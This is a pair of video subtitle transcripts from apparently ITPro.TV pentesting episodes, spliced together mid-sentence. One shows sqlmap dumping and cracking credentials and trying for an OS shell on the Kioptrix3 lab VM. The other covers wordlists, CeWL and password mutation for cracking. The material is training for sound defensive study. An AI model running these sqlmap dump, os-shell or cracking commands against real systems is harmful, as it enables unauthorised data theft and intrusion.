bone.\n\n391\n00:19:22.760 --> 00:19:27.677\nReally cool vulnerability scanner called\nSQLmap running around out there if you've\n\n392\n00:19:27.677 --> 00:19:31.237\ngot already installed it's already there,\nrun it.\n\n393\n00:19:31.237 --> 00:19:33.180\nShow you a couple of ways in\nwhich you can play with it.\n\n394\n00:19:33.180 --> 00:19:35.970\nIt basically automates the SQL process.\n\n395\n00:19:35.970 --> 00:19:39.390\nI'm gonna log out of this box here and\n\n396\n00:19:39.390 --> 00:19:44.290\nI'll just clear the screen and\nI'm gonna go in here and I'm gonna grab\n\n397\n00:19:46.040 --> 00:19:49.490\nthat because this is the injection,\nwhat's called the injection point.\n\n398\n00:19:49.490 --> 00:19:53.190\nThis is the area of\nthe website that is vulnerable.\n\n399\n00:19:53.190 --> 00:19:54.880\nSo you need that for this.\n\n400\n00:19:54.880 --> 00:19:55.620\nYou need to know where that is.\n\n401\n00:19:55.620 --> 00:19:57.360\nSo I'll just copy that.\n\n402\n00:19:58.980 --> 00:20:00.430\nAnd then we'll go back.\n\n403\n00:20:00.430 --> 00:20:01.500\nBecause I'll show you what happens.\n\n404\n00:20:01.500 --> 00:20:04.565\nIf you just run Sqlmap.\n\n405\n00:20:04.565 --> 00:20:09.200\nSqlmap- u for the URL, and\n\n406\n00:20:09.200 --> 00:20:15.095\nthen http://keyoptricks3.com.\n\n407\n00:20:15.095 --> 00:20:19.490\nIt says yeah, no parameters found testing.\n\n408\n00:20:19.490 --> 00:20:23.250\nYou have to find something\nlike get parameter id.\n\n409\n00:20:23.250 --> 00:20:26.730\nAll right, so that's what we found,\nso that's what it means.\n\n410\n00:20:26.730 --> 00:20:30.610\nSo we need to add that portion in there,\n\n411\n00:20:30.610 --> 00:20:35.120\nlet me just do this and I'll just paste\nit in because I think I copied it.\n\n412\n00:20:36.350 --> 00:20:42.597\nThere we go, so that should be a little\nmore, do I wanna add anything to that?\n\n413\n00:20:42.597 --> 00:20:46.030\nYou can do, yeah we'll leave it like that.\n\n414\n00:20:46.030 --> 00:20:47.320\nJust hit Enter.\n\n415\n00:20:47.320 --> 00:20:49.030\nAnd it starts looking for this.\n\n416\n00:20:49.030 --> 00:20:50.150\nIt'll ask you a few questions.\n\n417\n00:20:50.150 --> 00:20:54.080\nIt says it looks like the back\nend database is MySQL.\n\n418\n00:20:54.080 --> 00:20:57.170\nDo you wanna skip payload test for\nother databases?\n\n419\n00:20:57.170 --> 00:21:00.559\nWell if they think it's MySQL,\nyeah, I'll say yes.\n\n420\n00:21:01.600 --> 00:21:02.390\nLet's do that.\n\n421\n00:21:02.390 --> 00:21:05.330\nThe remaining test do you want\nincludes all test for my SQL,\n\n422\n00:21:05.330 --> 00:21:09.220\nextended providing level one and if you\nread about going to the land pages and\n\n423\n00:21:09.220 --> 00:21:11.780\neverything and\nstart learning how to use this tool.\n\n424\n00:21:11.780 --> 00:21:13.410\nDo you want it to use more values in that?\n\n425\n00:21:13.410 --> 00:21:17.210\nI'll just, yes everything here and\nsee what it'll do.\n\n426\n00:21:17.210 --> 00:21:18.120\nActually I probably won't go.\n\n427\n00:21:18.120 --> 00:21:21.403\nThere's a lot of data we saw all\nthe tables and columns in this thing.\n\n428\n00:21:21.403 --> 00:21:25.611\nI don't want it to get too crazy but it's\nautomatically looking at this database and\n\n429\n00:21:25.611 --> 00:21:26.391\nit's trying.\n\n430\n00:21:26.391 --> 00:21:29.793\n&gt;&gt; Yeah, you can see right there some\nof the commands it was running, sleep,\n\n431\n00:21:29.793 --> 00:21:32.110\nquery sleep, comment,\n&gt;&gt; Yep.\n\n432\n00:21:33.150 --> 00:21:36.860\nSo these are all testing to look for\npossible problems.\n\n433\n00:21:36.860 --> 00:21:40.780\nGet parameter Id appears to be MySQL or\nTime-Based Blind Injectable.\n\n434\n00:21:42.040 --> 00:21:45.590\nSo it's very informative as\nit goes through this thing,\n\n435\n00:21:45.590 --> 00:21:48.440\nit says to get primary id is you\nwant to keep testing the others?\n\n436\n00:21:48.440 --> 00:21:52.480\nI'll say no, just test this and we've\nalready found a good injection point and\n\n437\n00:21:52.480 --> 00:21:53.943\nlet's see what it comes out with here.\n\n438\n00:21:57.360 --> 00:21:59.260\nMaybe we should've went with yes on that.\n\n439\n00:21:59.260 --> 00:22:01.690\nWell, we found a good injection point.\n\n440\n00:22:01.690 --> 00:22:02.297\nWhat else can we do?\n\n441\n00:22:02.297 --> 00:22:04.965\nLet's try, let's dump the table entries,\nhow about that?\n\n442\n00:22:04.965 --> 00:22:07.588\nSounds like a good idea.\n\n443\n00:22:07.588 --> 00:22:09.723\nLet's just rerun our thing here.\n\n444\n00:22:09.723 --> 00:22:15.488\nBut this time we're gonna add --dbms=my\n\n445\n00:22:15.488 --> 00:22:19.391\nMySQL if I could get that out.\n\n446\n00:22:19.391 --> 00:22:20.394\nSo I'm forcing it,\n\n447\n00:22:20.394 --> 00:22:24.170\nletting it know this is the database\ntype that I want you to try to use.\n\n448\n00:22:24.170 --> 00:22:26.643\nAnd I'm gonna say --dump like that.\n\n449\n00:22:26.643 --> 00:22:29.188\nOf course it's cutting it off for me.\n\n450\n00:22:29.188 --> 00:22:31.950\nWe'll just see a little, there we go.\n\n451\n00:22:31.950 --> 00:22:36.082\nDump, and\nthen I'll tell it to use five threads.\n\n452\n00:22:37.709 --> 00:22:41.590\nFive, equals five, like so.\n\n453\n00:22:41.590 --> 00:22:42.100\nFire that off.\n\n454\n00:22:42.100 --> 00:22:44.910\nAnd see if we get any more information.\n\n455\n00:22:44.910 --> 00:22:47.390\nI already saw something scroll\nby that looked interesting.\n\n456\n00:22:47.390 --> 00:22:49.115\nI saw something more scroll\nby that looked interesting.\n\n457\n00:22:49.115 --> 00:22:52.968\n[LAUGH] I love watching this thing\nscroll by because you're like,\n\n458\n00:22:52.968 --> 00:22:54.684\nI can't wait to go back to that.\n\n459\n00:22:54.684 --> 00:22:57.750\nHey come on now, hurry up,\nI want to see this stuff.\n\n460\n00:22:57.750 --> 00:23:00.810\nI don't know how long this will take.\n\n461\n00:23:00.810 --> 00:23:02.670\nYeah, I'm just gonna scroll back up.\n\n462\n00:23:04.480 --> 00:23:07.090\nIt says do you want to store\nhashes to a temporary file for\n\n463\n00:23:07.090 --> 00:23:09.170\nfurther processing with other tools?\n\n464\n00:23:10.220 --> 00:23:11.160\nI'll say no for now.\n\n465\n00:23:11.160 --> 00:23:14.190\nDo you want to crack them via.\n\n466\n00:23:14.190 --> 00:23:15.870\nObviously it has found something.\n\n467\n00:23:15.870 --> 00:23:18.939\nI mean when you start\ntalking crack attacks,\n\n468\n00:23:18.939 --> 00:23:23.563\nthen it's probably found usernames or\npasswords or both, right?\n\n469\n00:23:23.563 --> 00:23:27.910\nSo I'll say yeah go for it, go for broke.\n\n470\n00:23:27.910 --> 00:23:31.802\nI will go with the defaults dictionary.\n\n471\n00:23:31.802 --> 00:23:32.333\nWhy the heck not?\n\n472\n00:23:32.333 --> 00:23:33.430\nYeah.\n\n473\n00:23:33.430 --> 00:23:34.820\nUse common password suffixes?\n\n474\n00:23:34.820 --> 00:23:38.250\nJust hit yes or whatever the defaults are.\n\n475\n00:23:38.250 --> 00:23:41.210\nSo it did.\nIt found cracked password master for\n\n476\n00:23:41.210 --> 00:23:43.220\nuser dreg, and there they go.\n\n477\n00:23:43.220 --> 00:23:45.558\nLet me scroll it up there.\n\n478\n00:23:45.558 --> 00:23:46.330\nWhere did you go?\n\n479\n00:23:46.330 --> 00:23:47.542\nWhere did you go?\nI saw you.\n\n480\n00:23:48.714 --> 00:23:51.820\nTable names, there they are.\n\n481\n00:23:53.150 --> 00:23:55.980\nSo it even found the usernames and\npasswords and cracked them for us.\n\n482\n00:23:55.980 --> 00:24:00.763\nRemember we had to do that using\nthe union all select statement to get all\n\n483\n00:24:00.763 --> 00:24:01.649\nthat stuff.\n\n484\n00:24:01.649 --> 00:24:06.397\nI just run sqlmap here,\nit can even try to get a shell.\n\n485\n00:24:06.397 --> 00:24:07.350\n&gt;&gt; Really.\n&gt;&gt; Yeah.\n\n486\n00:24:07.350 --> 00:24:09.310\nYou can even try to use\nit to try to get a shell.\n\n487\n00:24:09.310 --> 00:24:14.280\nAll you have to do is,\nif it's able to do it, you just add the,\n\n488\n00:24:14.280 --> 00:24:19.250\nwhat was the command, is it, --os show.\n\n489\n00:24:19.250 --> 00:24:20.240\nDo the whole same thing.\n\n490\n00:24:20.240 --> 00:24:21.820\nI mean, I guess we could\nget rid of that dump stuff.\n\n491\n00:24:21.820 --> 00:24:24.000\nWe don't need it to dump data out.\n\n492\n00:24:26.540 --> 00:24:27.252\nAnd then just do.\n\n493\n00:24:27.252 --> 00:24:31.266\n[SOUND] We don't need threads either.\n\n494\n00:24:31.266 --> 00:24:35.645\n--os-shell, like that,\nand just hit Return.\n\n495\n00:24:35.645 --> 00:24:39.745\nAnd it'll say, which application\nlanguage does this web server support?\n\n496\n00:24:39.745 --> 00:24:42.605\nI know it's running PHP,\nbecause we saw a bunch of PHP in there.\n\n497\n00:24:42.605 --> 00:24:44.125\nSo I'll say 4.\n\n498\n00:24:44.125 --> 00:24:47.055\nAnd then how do you\nwant to try to connect?\n\n499\n00:24:47.055 --> 00:24:50.495\nWhat do you wanna use for\nour writable directory?\n\n500\n00:24:50.495 --> 00:24:53.680\nRemember I told you there were no\nwritable directories other than temp?\n\n501\n00:24:53.680 --> 00:24:57.540\nI can try to brute force search, which\nis probably a good idea at that point.\n\n502\n00:24:57.540 --> 00:24:58.780\nHit Enter.\n\n503\n00:24:58.780 --> 00:25:00.840\nUse any addition custom directories.\n\n504\n00:25:00.840 --> 00:25:02.820\nThis is basically the list of\ndirectories it's gonna try.\n\n505\n00:25:02.820 --> 00:25:06.080\nSo if you wanna add any to that heap,\nnow's your chance.\n\n506\n00:25:06.080 --> 00:25:07.695\nJust hit Enter for none.\n\n507\n00:25:07.695 --> 00:25:09.155\nAnd then it brute forces through.\n\n508\n00:25:09.155 --> 00:25:14.418\nLooking for a writable web directory so\nthat it can inject shell code and\n\n509\n00:25:14.418 --> 00:25:18.115\npop you a shell right\nhere inside of SQL map.\n\n510\n00:25:18.115 --> 00:25:22.401\nIt won't find that, I've already done that\ntrick for you guys and waded through it.\n\n511\n00:25:22.401 --> 00:25:24.242\nIt'll just say none were found.\n\n512\n00:25:24.242 --> 00:25:29.372\nBut if one was, you get that shell prompt,\nyou'll be able to control the computer.\n\n513\n00:25:29.372 --> 00:25:31.882\n&gt;&gt; Scary stuff yet fantastic stuff.\n\n514\n00:25:31.882 --> 00:25:33.312\nWe appreciate that.\n\n515\n00:25:33.312 --> 00:25:37.872\nReally good looking explanation\non how we do SQL Injection.\n\n516\n00:25:37.872 --> 00:25:40.920\nWe had a two part so make sure you go\nback and watch that first one as well,\n\n517\n00:25:40.920 --> 00:25:41.740\na lot of good stuff there.\n\n518\n00:25:41.740 --> 00:25:47.550\nAnd this one really focused in on blind\nSQL injection and then some tools that\n\n519\n00:25:47.550 --> 00:25:52.740\nwe that can use like SQL map that'll help\nme automate some of this SQL injection,\n\n520\n00:25:52.740 --> 00:25:56.300\nfinding a vulnerable server and\nthen working with those commands there.\n\n521\n00:25:56.300 --> 00:25:59.960\nSo, great subject Andrew,\nwe appreciate those demonstrations.\n\n522\n00:25:59.960 --> 00:26:02.180\nWe hope everybody out there\nenjoyed watching this one.\n\n523\n00:26:02.180 --> 00:26:05.170\nSigning off for IT Pro TV,\nI've been your host Mike Rodrick.\n\n524\n00:26:05.170 --> 00:26:05.880\n&gt;&gt; And I'm Daniel Lowrie.\n\n525\n00:26:05.880 --> 00:26:08.347\n&gt;&gt; And we'll see you next time.\n\n526\n00:26:08.347 --> 00:26:14.247\n[MUSIC]\n\n527\n00:26:14.247 --> 00:26:17.640\n&gt;&gt; Thank you for

You're watching ITPro.TV.\n\n4\n00:00:12.268 --> 00:00:15.897\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITPro.TV.\n\n5\n00:00:15.897 --> 00:00:19.840\nI'm your host Mike Rodrick and\ntoday we're doing penetration testing.\n\n6\n00:00:19.840 --> 00:00:24.299\nIn this episode we're gonna be focusing\nin on one of everybody's favorite topics\n\n7\n00:00:24.299 --> 00:00:25.149\nit seems like.\n\n8\n00:00:25.149 --> 00:00:27.849\nAnd that is password crackling,\nand attacks.\n\n9\n00:00:27.849 --> 00:00:30.440\nThat's a very real, obviously, attack.\n\n10\n00:00:30.440 --> 00:00:34.890\nAnd here to show us the way, guide us\nthrough this process, is Mr Daniel Lowrie.\n\n11\n00:00:34.890 --> 00:00:35.472\nWelcome Mr Daniel.\n\n12\n00:00:35.472 --> 00:00:38.539\n&gt;&gt; Mike, glad to be back in the studio,\nyes we are back for\n\n13\n00:00:38.539 --> 00:00:40.288\nmore on our pentastic series.\n\n14\n00:00:40.288 --> 00:00:42.555\nAnd the word of the day is password.\n\n15\n00:00:42.555 --> 00:00:43.385\nThat's right.\n\n16\n00:00:43.385 --> 00:00:44.545\nIt was a fun game, and the show is off so.\n\n17\n00:00:44.545 --> 00:00:45.839\n&gt;&gt; Hey,\nyou've already cracked my password.\n\n18\n00:00:45.839 --> 00:00:46.555\n&gt;&gt; Yeah, I got him, see.\n\n19\n00:00:46.555 --> 00:00:47.175\n&gt;&gt; How did you do that?\n\n20\n00:00:47.175 --> 00:00:48.893\n[LAUGH]\n&gt;&gt; I know the man too well.\n\n21\n00:00:48.893 --> 00:00:50.385\n&gt;&gt; [LAUGH]\n&gt;&gt; You don't even wanna see what\n\n22\n00:00:50.385 --> 00:00:51.890\nhappens when we show up\nin the morning at work.\n\n23\n00:00:51.890 --> 00:00:52.929\nIt's shirt Madness.\n\n24\n00:00:52.929 --> 00:00:53.924\n&gt;&gt; [LAUGH]\n&gt;&gt; It's awesome.\n\n25\n00:00:53.924 --> 00:00:58.080\n[LAUGH] And for everybody that's in\nthe know, is laughing right now.\n\n26\n00:00:58.080 --> 00:01:00.600\nThat being said, let's talk passwords,\nlet's not talk shirts.\n\n27\n00:01:01.700 --> 00:01:02.540\nPassword cracking.\n\n28\n00:01:02.540 --> 00:01:03.200\nWhat is it?\n\n29\n00:01:03.200 --> 00:01:04.140\nWhy do we need to know about it?\n\n30\n00:01:04.140 --> 00:01:05.084\nWhy is it important?\n\n31\n00:01:05.084 --> 00:01:08.090\nAnd then what are the specifics\nabout it that we need to know?\n\n32\n00:01:08.090 --> 00:01:12.020\nPassword cracking, obviously, is that\nfrom time to time you will get a user and\n\n33\n00:01:12.020 --> 00:01:15.140\nyou'll find out that they have a password\nassociated with their account.\n\n34\n00:01:15.140 --> 00:01:17.473\nUnfortunately, they just don't\ngive you user accounts, and\n\n35\n00:01:17.473 --> 00:01:19.019\nyou just type in your name and your login.\n\n36\n00:01:19.019 --> 00:01:21.890\nThey had to put some form\nof security on top of that.\n\n37\n00:01:21.890 --> 00:01:24.770\nPasswords are very common.\n\n38\n00:01:24.770 --> 00:01:27.810\nSo if I can find out a user's password,\n\n39\n00:01:27.810 --> 00:01:32.980\nI can get a lot of entrance\ninto their environment.\n\n40\n00:01:32.980 --> 00:01:36.650\n&gt;&gt; Yeah, probably one of the weakest\nforms of authentication that we can use.\n\n41\n00:01:36.650 --> 00:01:37.577\nBut unfortunately,\n\n42\n00:01:37.577 --> 00:01:40.675\nit's also probably one of the easiest\nforms of authentication to use.\n\n43\n00:01:40.675 --> 00:01:41.960\nSo it is very common.\n\n44\n00:01:41.960 --> 00:01:44.410\n&gt;&gt; Yeah, it's right and users complain\nabout it all of the time, right?\n\n45\n00:01:44.410 --> 00:01:50.280\nSo, this is really like one-half\ntechnology, one-half user no likey.\n\n46\n00:01:50.280 --> 00:01:50.860\n&gt;&gt; Yeah.\n\n47\n00:01:50.860 --> 00:01:55.250\n&gt;&gt; And make it easy for me to use\ntechnology to get pass their little\n\n48\n00:01:55.250 --> 00:01:58.660\nroadblock they put in front of us,\nso we can get into a system.\n\n49\n00:01:58.660 --> 00:02:00.370\nSo let's jump right on out of the gate.\n\n50\n00:02:00.370 --> 00:02:04.390\nLet's talk about some of\nthe types of password attacks.\n\n51\n00:02:04.390 --> 00:02:06.400\nSo you got a username, you got a password.\n\n52\n00:02:06.400 --> 00:02:11.990\nTypically, the password is encrypted or\nhashed, in some variants, right?\n\n53\n00:02:11.990 --> 00:02:15.270\nSo there's attacks that\nyou can try to break that.\n\n54\n00:02:15.270 --> 00:02:17.700\nOne of them is called a dictionary\nattacks, where I'm starting.\n\n55\n00:02:17.700 --> 00:02:19.435\nI'm just making sure I'm\nstarting on dictionary attacks.\n\n56\n00:02:19.435 --> 00:02:20.890\nYes, dictionary attacks.\n\n57\n00:02:20.890 --> 00:02:22.120\nWhat's a dictionary attack?\n\n58\n00:02:22.120 --> 00:02:27.740\nI have a list of words commonly\nused as passwords or whatever.\n\n59\n00:02:27.740 --> 00:02:30.520\nJust, even just a list of words for\nmy language.\n\n60\n00:02:31.520 --> 00:02:32.780\nThat's where they come from, right?\n\n61\n00:02:32.780 --> 00:02:33.820\nIt is my language.\n\n62\n00:02:33.820 --> 00:02:34.930\nI speak English.\n\n63\n00:02:34.930 --> 00:02:37.671\nI'm just gonna put every word in\nthe English language in a file.\n\n64\n00:02:37.671 --> 00:02:41.006\nAnd I'm gonna try every word in\nthe English language against this user\n\n65\n00:02:41.006 --> 00:02:41.762\nas a password.\n\n66\n00:02:41.762 --> 00:02:45.043\nSo just continuously says,\nokay, here's user John.\n\n67\n00:02:45.043 --> 00:02:46.138\nLet's try a password.\n\n68\n00:02:46.138 --> 00:02:46.943\nThat didn't work.\n\n69\n00:02:46.943 --> 00:02:50.000\nLet's try password1,\nlet's try password2 and on, and so forth.\n\n70\n00:02:50.000 --> 00:02:54.060\n&gt;&gt; I have a copy of the Webster's\ndictionary, one word on each line.\n\n71\n00:02:54.060 --> 00:02:56.351\n&gt;&gt; Yeah, and that's right,\nyou can grab that.\n\n72\n00:02:56.351 --> 00:02:57.387\nYou go up to the internet,\n\n73\n00:02:57.387 --> 00:03:00.325\nthere's a lot of resources were these\nfiles are already created for you.\n\n74\n00:03:00.325 --> 00:03:03.230\nYou don't have to make them yourselves,\n[LAUGH] which is nice.\n\n75\n00:03:03.230 --> 00:03:07.744\nA couple of nice ones, I'll actually\nwiki here, a link called Skulls,\n\n76\n00:03:07.744 --> 00:03:11.900\nwiki.skullsecurity.org\n&gt;&gt; Let's actually go there.\n\n77\n00:03:11.900 --> 00:03:14.545\nThere's keyoptrics, open my Firefox.\n\n78\n00:03:14.545 --> 00:03:19.040\nif you go to https: look at them using\n\n79\n00:03:19.040 --> 00:03:23.390\nsecurity, wikiai.kullsecure,\n\n80\n00:03:23.390 --> 00:03:28.465\nthat's what it's messing with me here,\n\n81\n00:03:28.465 --> 00:03:32.964\n.org/index.php, that's bad.\n\n82\n00:03:32.964 --> 00:03:35.061\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n83\n00:03:35.061 --> 00:03:35.603\n&gt;&gt; title=,\n\n84\n00:03:35.603 --> 00:03:37.897\nman I'm already seeing some problems here.\n\n85\n00:03:37.897 --> 00:03:42.737\n[LAUGH]\n&gt;&gt; t i t l e=passwords like so, and\n\n86\n00:03:42.737 --> 00:03:46.350\nhit Enter,\n&gt;&gt; You go to this lovely page right here,\n\n87\n00:03:46.350 --> 00:03:48.940\nand they have some that you can download.\n\n88\n00:03:48.940 --> 00:03:52.193\nSome that come already with\nprograms like John the Ripper,\n\n89\n00:03:52.193 --> 00:03:55.265\nwhich is a password crack and\nwe're gonna look at that.\n\n90\n00:03:55.265 --> 00:04:00.490\nEnable, 500 worst passwords,\n370 banned Twitter passwords.\n\n91\n00:04:00.490 --> 00:04:02.700\nYou can just download these,\nthere's the download links.\n\n92\n00:04:02.700 --> 00:04:07.035\nThis one right here,\nthis rockyou.txt, you'll notice,\n\n93\n00:04:07.035 --> 00:04:09.165\nlook at the file size on that.\n\n94\n00:04:09.165 --> 00:04:12.625\nIt's a large file, it's got a lot\nof dictionary words in there.\n\n95\n00:04:12.625 --> 00:04:13.910\nIt's a really good one.\n\n96\n00:04:13.910 --> 00:04:18.500\nIf you have Kai Linux,\nprobably already has it available.\n\n97\n00:04:18.500 --> 00:04:22.990\nSo if you just bring up\nyour command prompts, and\n\n98\n00:04:22.990 --> 00:04:26.810\ndo a locate rockyou.txt.\n\n99\n00:04:26.810 --> 00:04:28.669\nIt'll show you where they are,\nthere's mine.\n\n100\n00:04:28.669 --> 00:04:33.376\nI actually have one in this\ndirectory that I'm already in.\n\n101\n00:04:33.376 --> 00:04:34.640\nRight there, rocky.2.\n\n102\n00:04:34.640 --> 00:04:36.940\nIt's just a flat file with words in it,\nthat's all it is.\n\n103\n00:04:36.940 --> 00:04:41.865\nIt's nothing special, other than it's\nhuge and already compiled for you.\n\n104\n00:04:41.865 --> 00:04:47.169\nAnd like I said, John the Ripper, it comes\nwith a small password file, as well.\n\n105\n00:04:47.169 --> 00:04:50.553\nLet's see here, you can also create\na dictionary yourself by typing them into\n\n106\n00:04:50.553 --> 00:04:52.870\na flat file,which will be monotonous and\nhorrible.\n\n107\n00:04:52.870 --> 00:04:55.085\n&gt;&gt; [LAUGH]\n&gt;&gt; You can also use a really,\n\n108\n00:04:55.085 --> 00:04:57.280\na cool tool called CeWL.\n\n109\n00:04:57.280 --> 00:04:59.785\nYeah, that was a weird sentence.\n\n110\n00:04:59.785 --> 00:05:02.920\n&gt;&gt; [LAUGH]\n&gt;&gt; C-E-W-L, CeWL, right?\n\n111\n00:05:02.920 --> 00:05:05.751\nWhat the elite speak, maybe,\nif that's maybe, I don't know, something.\n\n112\n00:05:05.751 --> 00:05:08.018\nC-E-W-L, it's not C-O-O-L.\n\n113\n00:05:08.018 --> 00:05:11.390\n&gt;&gt; [LAUGH]\n&gt;&gt; And you can, go ahead Mike.\n\n114\n00:05:11.390 --> 00:05:12.670\n&gt;&gt; I was gonna say, that's a great tool.\n\n115\n00:05:12.670 --> 00:05:16.101\nI've used it several times too,\nI interrupted you.\n\n116\n00:05:16.101 --> 00:05:17.502\nYou didn't get to tell them what it was.\n\n117\n00:05:17.502 --> 00:05:19.983\nIt will scan websites and look for words.\n\n118\n00:05:19.983 --> 00:05:23.966\nYou can say, finding the words over four\ncharacters, eight characters or whatever.\n\n119\n00:05:23.966 --> 00:05:27.662\nAnd a lot of times people\nlike to use maybe industry or\n\n120\n00:05:27.662 --> 00:05:31.280\nbusiness specific terms as their password,\nyes.\n\n121\n00:05:31.280 --> 00:05:35.250\nSo words I might not think of,\nmight not even be In a dictionary, but\n\n122\n00:05:35.250 --> 00:05:38.020\nthey're on your website because\nthey're part of a product description,\n\n123\n00:05:38.020 --> 00:05:41.200\nor a forum where people talk\nabout this kinda thing.\n\n124\n00:05:41.200 --> 00:05:44.140\nScour through those,\ngrab all those unique words.\n\n125\n00:05:44.140 --> 00:05:47.030\nPut one word that's cool,\nput one word on each line.\n\n126\n00:05:47.030 --> 00:05:48.470\nYou save it as a dictionary file, and\n\n127\n00:05:48.470 --> 00:05:50.920\nnow you've just got one more\ndictionary to run through.\n\n128\n00:05:50.920 --> 00:05:52.590\n&gt;&gt; Yeah, and it's super easy to run.\n\n129\n00:05:52.590 --> 00:05:55.800\nI worked for an insurance company\nhere in Florida, in Gainesville.\n\n130\n00:05:55.800 --> 00:05:59.330\nSo we weren't allowed to use things\nlike gators in our password or\n\n131\n00:05:59.330 --> 00:06:01.940\nUniversity of Florida insurance.\n\n132\n00:06:01.940 --> 00:06:04.300\nThings of that nature but\nour website is full of that and\n\n133\n00:06:04.300 --> 00:06:06.540\npeople break that rule all the time.\n\n134\n00:06:06.540 --> 00:06:11.420\nSo use cool to be able to footprint.\n\n135\n00:06:11.420 --> 00:06:13.080\nThe target.\n\n136\n00:06:13.080 --> 00:06:17.090\nI'm gonna show you how to do that here,\njust cewl and then your site,\n\n137\n00:06:17.090 --> 00:06:17.760\nwhatever the site is.\n\n138\n00:06:17.760 --> 00:06:20.110\nI'll use Kioptrics as ours\ncuz it's still running.\n\n139\n00:06:20.110 --> 00:06:24.830\nKioptrics3, that was from\nour SQL injection class.\n\n140\n00:06:24.830 --> 00:06:26.228\nAnd it has a website running there.\n\n141\n00:06:26.228 --> 00:06:27.426\n.com.\n\n142\n00:06:27.426 --> 00:06:31.390\nAnd then we do a -m to say, what is the,\n\n143\n00:06:31.390 --> 00:06:33.010\nI can't remember if it's\nminimum over maximum.\n\n144\n00:06:33.010 --> 00:06:34.210\nI think it's minimum.\n\n145\n00:06:34.210 --> 00:06:36.490\nYeah I'm pretty sure it's\nminimum length of word.\n\n146\n00:06:36.490 --> 00:06:38.540\nSo I don't want of and the All right.\n\n147\n00:06:38.540 --> 00:06:41.670\nI want words with some substance\nthat aren't just fillers, right?\n\n148\n00:06:41.670 --> 00:06:44.290\nSo anything most are bigger\nthan six words, and\n\n149\n00:06:44.290 --> 00:06:49.760\nI'll say dash w and we'll just give it,\nwhere do you wanna right this to?\n\n150\n00:06:49.760 --> 00:06:51.660\nI'll call it's kiop.text.\n\n151\n00:06:51.660 --> 00:06:54.550\nThere we go.\n\n152\n00:06:54.550 --> 00:06:59.120\nSoftware are raises, it looks like\nit's already done, I can cat kiop.txt.\n\n153\n00:06:59.120 --> 00:06:59.620\nAnd look at that.\n\n154\n00:06:59.620 --> 00:07:02.760\nI got a, word list ready to rock.\n\n155\n00:07:02.760 --> 00:07:04.880\nSo it was that quick and\nit was super quick.\n\n156\n00:07:04.880 --> 00:07:07.690\nObviously I'm on a LAN or\nwhatever, but you get the idea.\n\n157\n00:07:07.690 --> 00:07:08.360\nVery simple to run.\n\n158\n00:07:08.360 --> 00:07:12.570\nAll right, let's talk really\nquickly about password mutation.\n\n159\n00:07:12.570 --> 00:07:17.424\nBecause Mike loves the word password for\npasswords because it's easy to remember.\n\n160\n00:07:17.424 --> 00:07:21.115\nI gotta go Mike, you can't use\npassword for your password, okay.\n\n161\n00:07:21.115 --> 00:07:21.940\n&gt;&gt; That fixed it.\n\n162\n00:07:21.940 --> 00:07:22.996\n&gt;&gt; You did, right?\n\n163\n00:07:22.996 --> 00:07:24.097\nAnd you used mutation to do so.\n\n164\n00:07:24.097 --> 00:07:24.640\nAm I correct?\n\n165\n00:07:24.640 --> 00:07:25.986\n&gt;&gt; I did.\n\n166\n00:07:25.986 --> 00:07:27.409\nI put a one at the end of my password.\n\n167\n00:07:27.409 --> 00:07:30.540\n[LAUGH]\n&gt;&gt; We're joking and having a good time.\n\n168\n00:07:30.540 --> 00:07:33.250\nBut that is technically\na mutation of the password.\n\n169\n00:07:33.250 --> 00:07:36.457\nIt's still a password to\nMike in his human mind.\n\n170\n00:07:36.457 --> 00:07:39.140\nWell all he has to do now is remember\nthat there's a one on the end.\n\n171\n00:07:39.140 --> 00:07:41.594\n&gt;&gt; And in February, well actually right\nnow, I'm going to change it to 2,\n\n172\n00:07:41.594 --> 00:07:42.717\nbecause it's the second month.\n\n173\n00:07:42.717 --> 00:07:44.952\nSo my password will be password2.\n\n174\n00:07:44.952 --> 00:07:46.430\n&gt;&gt; Perfect.\n\n175\n00:07:46.430 --> 00:07:47.710\nWelcome to password mutation.\n\n176\n00:07:47.710 --> 00:07:50.645\nJust adding some changes to the password,\nso\n\n177\n00:07:50.645 --> 00:07:55.910\nthat they're still easy to remember, but\naren't just a word in a file, right?\n\n178\n00:07:55.910 --> 00:08:00.785\nSo, that can definitely affect your\npassword cracking because now There's\n\n179\n00:08:00.785 --> 00:08:05.070\ngonna be a set of characters maybe,\nthat you'll have to deal with.\n\n180\n00:08:05.070 --> 00:08:09.230\n&gt;&gt; So did I completely avoid your ability\nto break my password by adding that one?\n\n181\n00:08:09.230 --> 00:08:10.660\n&gt;&gt; Yeah, unfortunately no.\n\n182\n00:08:10.660 --> 00:08:14.530\nYou didn't do that because I can\naccount for that as the attacker.\n\n183\n00:08:14.530 --> 00:08:18.760\nI can say, I can write a script,\nthat says look through this file, and\n\n184\n00:08:18.760 --> 00:08:21.520\nadd these characters,\nto the beginning of it, right.\n\n185\n00:08:21.520 --> 00:08:27.490\nSo if I think maybe I've opened\na free account and it says you must\n\n186\n00:08:27.490 --> 00:08:31.400\nhave two numbers at the beginning of your\npassword or it's not a valid password.\n\n187\n00:08:31.400 --> 00:08:35.140\nOkay now I know some of their\npassword policy, use two numbers.\n\n188\n00:08:35.140 --> 00:08:36.800\nOr Bob works there and\n\n189\n00:08:36.800 --> 00:08:40.560\nhe's like man they're killing\nme with this password business.\n\n190\n00:08:40.560 --> 00:08:44.370\nThey make you have to use one special\ncharacter, one upper case and\n\n191\n00:08:44.370 --> 00:08:46.560\nthen a number at the end, is that a fact?\n\n192\n00:08:46.560 --> 00:08:50.190\nThat's wonderful and now that I\nknow that so you can build that up.\n\n193\n00:08:50.190 --> 00:08:53.490\nLet me see what else do you\nwanna know about mutation,\n\n194\n00:08:53.490 --> 00:08:57.270\nthey can be at the beginning, and\nthe middle, at the end of the password,\n\n195\n00:08:57.270 --> 00:09:01.549\ntypically there's usually one special\ncharacter, upper and lower case.\n\n196\n00:09:02.820 --> 00:09:04.680\nAnd usually a number associated as well.\n\n197\n00:09:04.680 --> 00:09:06.370\nAnd like I said,\nyou can use a Bash script or\n\n198\n00:09:06.370 --> 00:09:09.240\nany other third party tool\nto help you out with that.\n\n199\n00:09:09.240 --> 00:09:13.110\n&gt;&gt; Yeah, a lot of people tend to think,\nif I replace that a with an @,\n\n200\n00:09:13.110 --> 00:09:17.150\nit's no longer gonna match those\ndictionary files I'm safe.\n\n201\n00:09:17.150 --> 00:09:21.250\nWell, the pen testers, the attackers,\nthey know these techniques as well.\n\n202\n00:09:21.250 --> 00:09:24.230\nSo you just take that dictionary\nfile you just made and then\n\n203\n00:09:24.230 